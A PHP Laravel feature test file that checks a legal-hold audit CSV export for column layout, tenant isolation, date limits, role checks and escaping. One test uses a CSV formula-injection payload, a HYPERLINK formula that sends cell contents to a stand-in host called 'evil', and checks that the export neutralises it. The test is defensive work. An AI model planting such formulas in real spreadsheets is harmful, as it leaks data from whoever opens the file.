<?php

declare(strict_types=1);

namespace Tests\Feature\LegalHold;

use App\Models\AuditLog;
use App\Models\Invoice;
use App\Models\LegalHold;
use App\Models\User;
use App\Services\Legal\LegalHoldAuditExportService;
use App\Support\LegalHoldRegistry;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;
use Tests\Traits\CreatesTestData;

/**
 * Phase-65 AUDIT-DEPTH watchdog: CSV export + signed-URL streaming +
 * AuditLog scopeForLawfulBasis + date-range cap.
 */
class Phase65AuditDepthTest extends TestCase
{
    use CreatesTestData, RefreshDatabase;

    private User $landlord;

    private User $otherLandlord;

    protected function setUp(): void
    {
        parent::setUp();
        Cache::flush();
        Storage::fake('local');

        config(['security.audit.log_in_console' => true]);
        config(['security.audit.logged_events' => []]);

        $a = $this->createLandlordWithFullSetup();
        $this->landlord = $a['landlord'];

        $b = $this->createLandlordWithFullSetup();
        $this->otherLandlord = $b['landlord'];
    }

    public function test_csv_export_contains_utf8_bom_and_required_columns(): void
    {
        $invoice = Invoice::factory()->create(['landlord_id' => $this->landlord->id]);
        $this->actingAs($this->landlord);
        LegalHoldRegistry::hold($invoice, $this->landlord, 'litigation preservation order');

        $service = app(LegalHoldAuditExportService::class);
        $relative = $service->exportToCsv(
            $this->landlord,
            Carbon::now()->subMonth(),
            Carbon::now()->addDay(),
        );

        $contents = Storage::disk('local')->get($relative);

        $this->assertNotNull($contents);
        $this->assertStringStartsWith("\xEF\xBB\xBF", $contents, 'CSV must start with UTF-8 BOM');
        $this->assertStringContainsString('event_at,event_type,subject_type,subject_id,reason,actor_user_id,actor_user_name,lawful_basis', $contents);
        $this->assertStringContainsString('Invoice', $contents);
        $this->assertStringContainsString('legal_obligation', $contents);
    }

    public function test_csv_export_excludes_other_landlords(): void
    {
        $mine = Invoice::factory()->create(['landlord_id' => $this->landlord->id]);
        $theirs = Invoice::factory()->create(['landlord_id' => $this->otherLandlord->id]);

        $this->actingAs($this->landlord);
        LegalHoldRegistry::hold($mine, $this->landlord, 'my landlord reason long enough');
        $this->actingAs($this->otherLandlord);
        LegalHoldRegistry::hold($theirs, $this->otherLandlord, 'other landlord reason long enough');
        $this->actingAs($this->landlord);

        $service = app(LegalHoldAuditExportService::class);
        $relative = $service->exportToCsv(
            $this->landlord,
            Carbon::now()->subMonth(),
            Carbon::now()->addDay(),
        );

        $contents = Storage::disk('local')->get($relative);

        $this->assertStringContainsString('my landlord reason long enough', $contents);
        $this->assertStringNotContainsString('other landlord reason long enough', $contents);
    }

    public function test_csv_export_respects_date_window(): void
    {
        $invoice = Invoice::factory()->create(['landlord_id' => $this->landlord->id]);
        $this->actingAs($this->landlord);
        $hold = LegalHoldRegistry::hold($invoice, $this->landlord, 'old hold from long ago');

        AuditLog::query()
            ->where('auditable_type', LegalHold::class)
            ->where('auditable_id', $hold->id)
            ->update(['created_at' => Carbon::now()->subYears(3)]);

        $service = app(LegalHoldAuditExportService::class);
        $relative = $service->exportToCsv(
            $this->landlord,
            Carbon::now()->subMonth(),
            Carbon::now()->addDay(),
        );

        $contents = Storage::disk('local')->get($relative);

        $this->assertStringNotContainsString('old hold from long ago', $contents);
    }

    public function test_endpoint_rejects_range_over_two_years(): void
    {
        $response = $this->actingAs($this->landlord)->get(route('legal-holds.audit-export', [
            'from' => Carbon::now()->subYears(3)->toDateString(),
            'to' => Carbon::now()->toDateString(),
        ]));

        $response->assertSessionHasErrors('to');
    }

    public function test_endpoint_requires_landlord_role(): void
    {
        $tenant = User::factory()->create(['role' => 'tenant']);

        $response = $this->actingAs($tenant)->get(route('legal-holds.audit-export', [
            'from' => Carbon::now()->subMonth()->toDateString(),
            'to' => Carbon::now()->toDateString(),
        ]));

        $response->assertForbidden();
    }

    public function test_audit_log_scope_for_lawful_basis_filters_correctly(): void
    {
        $invoice = Invoice::factory()->create(['landlord_id' => $this->landlord->id]);
        $this->actingAs($this->landlord);
        LegalHoldRegistry::hold($invoice, $this->landlord, 'reason long enough');

        $count = AuditLog::query()
            ->forModel(LegalHold::class)
            ->forLawfulBasis('legal_obligation')
            ->count();

        $this->assertGreaterThanOrEqual(1, $count);

        $contractCount = AuditLog::query()
            ->forModel(LegalHold::class)
            ->forLawfulBasis('contract')
            ->count();

        $this->assertSame(0, $contractCount);
    }

    public function test_csv_injection_prefix_is_neutralised(): void
    {
        $invoice = Invoice::factory()->create(['landlord_id' => $this->landlord->id]);
        $this->actingAs($this->landlord);
        LegalHoldRegistry::hold($invoice, $this->landlord, '=HYPERLINK("//evil/"&A1,"click here for $1000")');

        $service = app(LegalHoldAuditExportService::class);
        $relative = $service->exportToCsv(
            $this->landlord,
            Carbon::now()->subMonth(),
            Carbon::now()->addDay(),
        );

        $contents = Storage::disk('local')->get($relative);

        $this->assertStringContainsString("'=HYPERLINK", $contents,
            'Excel formula prefix must be neutralised with leading apostrophe');
    }

    public function test_csv_escapes_reason_containing_commas_and_quotes(): void
    {
        $invoice = Invoice::factory()->create(['landlord_id' => $this->landlord->id]);
        $reason = 'Court order CV/2026/0123, citing "preservation directive", urgent';
        $this->actingAs($this->landlord);
        LegalHoldRegistry::hold($invoice, $this->landlord, $reason);

        $service = app(LegalHoldAuditExportService::class);
        $relative = $service->exportToCsv(
            $this->landlord,
            Carbon::now()->subMonth(),
            Carbon::now()->addDay(),
        );

        $contents = Storage::disk('local')->get($relative);

        $this->assertStringContainsString('"Court order CV/2026/0123, citing ""preservation directive"", urgent"', $contents);
    }
}
